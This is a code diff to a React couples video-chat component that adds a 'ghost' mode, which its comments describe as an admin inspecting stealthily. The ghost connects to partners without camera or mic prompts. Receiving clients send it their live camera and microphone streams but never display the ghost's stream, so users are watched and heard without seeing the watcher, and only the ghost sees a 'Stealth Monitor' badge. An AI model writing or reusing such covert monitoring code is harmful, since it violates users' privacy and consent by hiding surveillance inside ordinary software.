@@ -285,6 +285,7 @@ export default function CouplesOverlay({
   onStreamsChange,
   isMobileCallActive = false,
   onSwitchToCallTab,
+  isGhost = false,
 }) {
   const [mine, setMine] = useState(null);
   const [remote, setRemote] = useState({});     // peerId -> MediaStream
@@ -349,7 +350,7 @@ export default function CouplesOverlay({
     }
 
     try {
-      const c = peerRef.current.call(targetId, local.current, { metadata: { type: 'cam' } });
+      const c = peerRef.current.call(targetId, local.current, { metadata: { type: 'cam', isGhost: Boolean(isGhost) } });
       if (!c) return;
       activeCalls.current.set(targetId, c);
 
@@ -465,6 +466,7 @@ export default function CouplesOverlay({
           c.on('close', () => onScreen(null));
         } else {
           const partnerId = c.peer;
+          const isGhostCaller = Boolean(c.metadata?.isGhost);
           activeCalls.current.set(partnerId, c);
 
           const answerWithStream = (streamToAnswer) => {
@@ -474,24 +476,27 @@ export default function CouplesOverlay({
               console.warn('Error answering call:', err);
             }
 
-            c.on('stream', (s) => {
-              setRemote((prev) => ({ ...prev, [partnerId]: s }));
-              clampBitrates(c.peerConnection);
-            });
-
-            c.on('close', () => {
-              activeCalls.current.delete(partnerId);
-              setRemote((prev) => {
-                const next = { ...prev };
-                delete next[partnerId];
-                return next;
+            // 👻 If caller is an admin ghost inspecting stealthily, DO NOT render or play their stream
+            if (!isGhostCaller) {
+              c.on('stream', (s) => {
+                setRemote((prev) => ({ ...prev, [partnerId]: s }));
+                clampBitrates(c.peerConnection);
               });
-            });
 
-            c.on('error', (err) => {
-              console.warn('Incoming call error with', partnerId, err);
-              activeCalls.current.delete(partnerId);
-            });
+              c.on('close', () => {
+                activeCalls.current.delete(partnerId);
+                setRemote((prev) => {
+                  const next = { ...prev };
+                  delete next[partnerId];
+                  return next;
+                });
+              });
+
+              c.on('error', (err) => {
+                console.warn('Incoming call error with', partnerId, err);
+                activeCalls.current.delete(partnerId);
+              });
+            }
           };
 
           if (local.current) {
@@ -503,7 +508,10 @@ export default function CouplesOverlay({
                 answerWithStream(local.current);
               }
             }, 100);
-            setTimeout(() => clearInterval(checkLocalTimer), 6000);
+            setTimeout(() => {
+              clearInterval(checkLocalTimer);
+              if (!local.current) answerWithStream(blank());
+            }, 6000);
           }
         }
       });
@@ -512,6 +520,30 @@ export default function CouplesOverlay({
     // Acquire camera & microphone with progressive fallback
     (async () => {
       let stream = null;
+
+      // 👻 100% STEALTH GHOST MODE:
+      // ZERO camera prompt, ZERO mic prompt, ZERO camera hardware LED activation!
+      if (isGhost) {
+        stream = blank(); // only blank video canvas, 0 audio tracks
+        if (dead) return;
+        local.current = stream;
+        setMine(null);
+        setCam(false);
+        setMic(false);
+        onCamChange?.(false);
+        onMicChange?.(false);
+        onStreamsChange?.({
+          mine: null,
+          remote: {},
+          cam: false,
+          mic: false,
+          voiceOnly: false,
+          localTalking: false,
+          remoteTalking: {},
+        });
+        await openPeer();
+        return;
+      }
       try {
         // Ideal standard parameters (good quality + low CPU on phones)
         stream = await navigator.mediaDevices.getUserMedia({
@@ -607,7 +639,7 @@ export default function CouplesOverlay({
       partnerUsers.forEach((partner) => {
         // If partner is present in room, but we don't have their stream yet:
         if (!remote[partner.id]) {
-          if (me < partner.id) {
+          if (isGhost || me < partner.id) {
             callPeer(partner.id);
           } else {
             // Signal partner to retry calling us
@@ -620,7 +652,7 @@ export default function CouplesOverlay({
     const interval = setInterval(checkConnections, 3200);
     checkConnections();
     return () => clearInterval(interval);
-  }, [users, ready, remote, me, socket, callPeer]);
+  }, [users, ready, remote, me, socket, callPeer, isGhost]);
 
   // GSAP Draggable for video window
   useEffect(() => {
@@ -636,6 +668,7 @@ export default function CouplesOverlay({
 
   // Physical Camera Hardware Toggle: Stops hardware sensor to completely power down device camera light
   const toggleCam = async () => {
+    if (isGhost) return; // Ghost mode never touches physical camera hardware
     if (camSwitching) return;
     setCamSwitching(true);
 
@@ -726,6 +759,7 @@ export default function CouplesOverlay({
   };
 
   const toggleMic = () => {
+    if (isGhost) return; // Ghost mode never touches microphone
     const next = !mic;
     local.current?.getAudioTracks().forEach((t) => (t.enabled = next));
     setMic(next);
@@ -813,16 +847,18 @@ export default function CouplesOverlay({
           {/* Large Video Grid for Mobile */}
           <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
             {/* Local Preview Tile */}
-            <div className="relative aspect-video w-full overflow-hidden rounded-xl bg-black border border-white/10">
-              <Tile
-                stream={mine}
-                name="You"
-                isPartner={false}
-                voiceOnly={voiceOnly}
-                isSpeaking={localTalking}
-                isCamOff={!cam}
-              />
-            </div>
+            {!isGhost && (
+              <div className="relative aspect-video w-full overflow-hidden rounded-xl bg-black border border-white/10">
+                <Tile
+                  stream={mine}
+                  name="You"
+                  isPartner={false}
+                  voiceOnly={voiceOnly}
+                  isSpeaking={localTalking}
+                  isCamOff={!cam}
+                />
+              </div>
+            )}
 
             {/* Remote Partner Tiles */}
             {users.filter((u) => u.id !== me).map((u) => (
@@ -931,9 +967,18 @@ export default function CouplesOverlay({
             </div>
           </div>
 
+          {isGhost && (
+            <div className="mb-2 px-2.5 py-1 rounded-xl bg-purple-950/80 border border-purple-500/40 text-[10px] text-purple-300 flex items-center justify-between">
+              <span className="font-bold flex items-center gap-1">👻 Stealth Monitor</span>
+              <span className="text-[9px] text-purple-400">0 Cam/Mic Used</span>
+            </div>
+          )}
+
           <div className={`flex ${layout === 'side' ? 'flex-row overflow-x-auto max-w-[85vw]' : 'flex-col'} gap-2`}>
             {/* Local User Tile */}
-            <Tile stream={mine} name="You" isPartner={false} voiceOnly={voiceOnly} isSpeaking={localTalking} isCamOff={!cam} />
+            {!isGhost && (
+              <Tile stream={mine} name="You" isPartner={false} voiceOnly={voiceOnly} isSpeaking={localTalking} isCamOff={!cam} />
+            )}
 
             {/* Remote Peer Tiles */}
             {users.filter((u) => u.id !== me).map((u) => (
